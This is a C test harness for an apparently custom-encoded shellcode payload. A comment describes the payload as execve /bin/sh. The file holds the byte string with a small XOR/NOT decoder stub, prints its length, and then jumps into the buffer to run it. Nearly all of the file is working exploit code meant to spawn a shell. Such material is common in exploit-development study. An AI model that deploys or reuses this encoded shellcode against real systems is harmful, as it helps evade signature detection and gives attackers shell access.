#include<stdio.h>
#include<string.h>

//custom encoder, execve-stack /bin/sh
unsigned char code [] = \
"\xeb\x14\x5e\x31\xc9\xb1\x19\xf6\x16\x80\x36\xbb\xf6\x16\x80\x36\xaa\x46\xe2\xf3\xeb\x05\xe8\xe7\xff\xff\xff\x20\xd1\x41\x79\x3e\x3e\x62\x79\x79\x3e\x73\x78\x7f\x98\xf2\x41\x98\xf3\x42\x98\xf0\xa1\x1a\xdc\x91";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();
}

	
